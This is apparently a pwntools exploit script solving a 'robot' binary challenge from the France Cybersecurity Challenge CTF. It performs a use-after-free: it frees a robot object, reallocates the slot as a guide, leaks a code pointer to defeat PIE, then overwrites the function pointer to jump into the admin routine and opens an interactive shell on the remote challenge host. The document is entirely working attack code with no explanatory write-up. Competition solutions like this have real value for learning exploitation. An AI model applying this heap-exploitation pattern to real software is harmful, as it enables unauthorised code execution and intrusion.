#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('robot')

host = args.HOST or 'challenges.france-cybersecurity-challenge.fr'
port = int(args.PORT or 2101)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+141
b *main+614
b *admin+165
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# User after free
# create robot
# delete robot
# create guide
# leak

# create robot
io.sendlineafter(b'Quitter', b'1')
io.sendlineafter(b'appelez ?\n', b'toto')

# delete robot
io.sendlineafter(b'> ', b'3')

# create guide
io.sendlineafter(b'Quitter',b'4')

p = b'A'*2
#p += p64(exe.sym['admin']+165)

io.sendlineafter(b'...\n',p)

# make noise robot
io.sendlineafter(b'> ',b'5')
io.recvuntil(b'AA\n')
io.recv(13)
leak2 = u64(io.recv(8))

exe.address = leak2 - exe.sym['bleep']
log.info(f'{leak2 = :x} {exe.address = :x}')

# create robot
io.sendlineafter(b'Quitter', b'1')
io.sendlineafter(b'appelez ?\n', b'toto')

# delete robot
io.sendlineafter(b'> ', b'3')

# create guide
io.sendlineafter(b'Quitter',b'4')

p = b'A'*16
p += p64(exe.sym['admin']+165)

io.sendlineafter(b'...\n',p)

# make noise robot
io.sendlineafter(b'> ', b'2')

io.interactive()

